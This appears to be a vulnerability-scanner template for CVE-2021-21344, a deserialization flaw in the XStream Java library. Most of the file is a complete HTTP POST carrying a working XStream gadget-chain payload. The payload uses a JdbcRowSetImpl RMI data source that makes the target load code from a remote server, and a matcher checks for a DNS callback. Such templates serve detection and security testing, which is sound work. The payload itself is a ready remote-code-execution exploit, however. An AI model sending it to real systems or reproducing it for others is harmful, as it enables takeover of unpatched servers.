id: CVE-2021-21344

info:
  name: CVE-2021-21344
  author: pwnhxl
  severity: high
  description: The processed stream at unmarshalling time contains type information to recreate the formerly written objects. XStream creates therefore new instances based on these type information. An attacker can manipulate the processed input stream and replace or inject objects, that result in execution of arbitrary code loaded from a remote server.
  reference:
    - https://x-stream.github.io/CVE-2021-21344.html
  tags: cve,cve-2021,xstream,deserialization,rce

requests:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <java.util.PriorityQueue serialization='custom'>
          <unserializable-parents/>
          <java.util.PriorityQueue>
            <default>
              <size>2</size>
              <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>
                <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>
                  <packet>
                    <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>
                      <dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'>
                        <bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'>
                          <bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'>
                            <bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'>
                              <jaxbType>com.sun.rowset.JdbcRowSetImpl</jaxbType>
                              <uriProperties/>
                              <attributeProperties/>
                              <inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'>
                                <getter>
                                  <class>com.sun.rowset.JdbcRowSetImpl</class>
                                  <name>getDatabaseMetaData</name>
                                  <parameter-types/>
                                </getter>
                              </inheritedAttWildcard>
                            </bi>
                            <tagName/>
                            <context>
                              <marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'>
                                <outer-class reference='../..'/>
                              </marshallerPool>
                              <nameList>
                                <nsUriCannotBeDefaulted>
                                  <boolean>true</boolean>
                                </nsUriCannotBeDefaulted>
                                <namespaceURIs>
                                  <string>1</string>
                                </namespaceURIs>
                                <localNames>
                                  <string>UTF-8</string>
                                </localNames>
                              </nameList>
                            </context>
                          </bridge>
                        </bridge>
                        <jaxbObject class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>
                          <javax.sql.rowset.BaseRowSet>
                            <default>
                              <concurrency>1008</concurrency>
                              <escapeProcessing>true</escapeProcessing>
                              <fetchDir>1000</fetchDir>
                              <fetchSize>0</fetchSize>
                              <isolation>2</isolation>
                              <maxFieldSize>0</maxFieldSize>
                              <maxRows>0</maxRows>
                              <queryTimeout>0</queryTimeout>
                              <readOnly>true</readOnly>
                              <rowSetType>1004</rowSetType>
                              <showDeleted>false</showDeleted>
                              <dataSource>rmi://localhost:15000/CallRemoteMethod</dataSource>
                              <params/>
                            </default>
                          </javax.sql.rowset.BaseRowSet>
                          <com.sun.rowset.JdbcRowSetImpl>
                            <default>
                              <iMatchColumns>
                                <int>-1</int>
                                <int>-1</int>
                                <int>-1</int>
                                <int>-1</int>
                                <int>-1</int>
                                <int>-1</int>
                                <int>-1</int>
                                <int>-1</int>
                                <int>-1</int>
                                <int>-1</int>
                              </iMatchColumns>
                              <strMatchColumns>
                                <string>foo</string>
                                <null/>
                                <null/>
                                <null/>
                                <null/>
                                <null/>
                                <null/>
                                <null/>
                                <null/>
                                <null/>
                              </strMatchColumns>
                            </default>
                          </com.sun.rowset.JdbcRowSetImpl>
                        </jaxbObject>
                      </dataSource>
                    </message>
                    <satellites/>
                    <invocationProperties/>
                  </packet>
                </indexMap>
              </comparator>
            </default>
            <int>3</int>
            <string>javax.xml.ws.binding.attachments.inbound</string>
            <string>javax.xml.ws.binding.attachments.inbound</string>
          </java.util.PriorityQueue>
        </java.util.PriorityQueue>

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
